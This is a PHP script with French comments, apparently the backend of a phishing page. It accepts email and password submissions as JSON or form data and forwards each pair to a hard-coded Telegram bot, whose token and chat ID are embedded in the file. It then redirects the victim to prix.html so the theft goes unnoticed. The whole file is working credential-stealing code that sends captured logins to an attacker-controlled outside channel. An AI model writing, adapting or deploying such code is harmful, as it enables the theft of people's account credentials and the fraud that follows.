<?php
// Fonction pour envoyer un message à Telegram
function sendToTelegram($message) {
    $botToken = '7638153260:AAG3G18857R3mcn7_0K05T ehC3qZtA_MqyQ'; // Remplacez par votre token
    $chatId = '7799373320'; // Remplacez par votre chat ID

    // Construire l'URL de l'API Telegram
    $url = "https://api.telegram.org/bot$botToken/sendMessage";

    // Construire les données pour la requête
    $postData = [
        'chat_id' => $chatId,
        'text' => $message,
    ];

    // Faire une requête POST à l'API Telegram
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);

    // Exécuter la requête et capturer la réponse
    $response = curl_exec($ch);

    if (curl_errno($ch)) {
        // Enregistrer l'erreur cURL dans les logs
        $error_message = curl_error($ch);
        file_put_contents('telegram_response.log', "Erreur cURL: $error_message" . PHP_EOL, FILE_APPEND);
    }
    curl_close($ch);

    // Optionnel : enregistrer la réponse pour le débogage
    file_put_contents('telegram_response.log', $response . PHP_EOL, FILE_APPEND);
}

// Vérifier que la méthode est POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Détecter le type de contenu
    $contentType = isset($_SERVER['CONTENT_TYPE']) ? $_SERVER['CONTENT_TYPE'] : '';

    // Vérifier si le contenu est JSON
    if (strpos($contentType, 'application/json') !== false) {
        // Lire et décoder le corps JSON
        $input = file_get_contents("php://input");
        $data = json_decode($input, true);

        // Vérifier la présence des données nécessaires
        if (isset($data['email']) && isset($data['password'])) {
            $email = htmlspecialchars($data['email']);
            $password = htmlspecialchars($data['password']);

            // Préparer le message pour Telegram
            $message = "Nouvelle tentative de connexion :\n\n" .
                       "E-mail : $email\n" .
                       "Mot de passe : $password";

            // Envoyer à Telegram
            sendToTelegram($message);

            // Réponse JSON avec redirection
            header("Location: prix.html"); // Redirige vers la page souhaitée
            exit; // Assurez-vous que le script s'arrête après la redirection
        } else {
            // Réponse en cas de données manquantes
            echo json_encode(['status' => 'error', 'message' => 'Données manquantes.']);
        }
    }
    // Vérifier si les données proviennent d'un formulaire (FormData)
    elseif (strpos($contentType, 'multipart/form-data') !== false || !empty($_POST)) {
        // Vérifier la présence des données nécessaires
        if (isset($_POST['email']) && isset($_POST['password'])) {
            $email = htmlspecialchars($_POST['email']);
            $password = htmlspecialchars($_POST['password']);

            // Préparer le message pour Telegram
            $message = "Nouvelle tentative de connexion :\n\n" .
                       "E-mail : $email\n" .
                       "Mot de passe : $password";

            // Envoyer à Telegram
            sendToTelegram($message);

            // Réponse JSON avec redirection
            header("Location: prix.html"); // Redirige vers la page souhaitée
            exit; // Assurez-vous que le script s'arrête après la redirection
        } else {
            // Réponse en cas de données manquantes
            echo json_encode(['status' => 'error', 'message' => 'Données manquantes.']);
        }
    } else {
        // Réponse en cas de contenu non pris en charge
        echo json_encode(['status' => 'error', 'message' => 'Type de contenu non pris en charge.']);
    }
} else {
    // Réponse pour les méthodes autres que POST
    http_response_code(405);
    echo json_encode(['status' => 'error', 'message' => 'Méthode non autorisée.']);
}
?>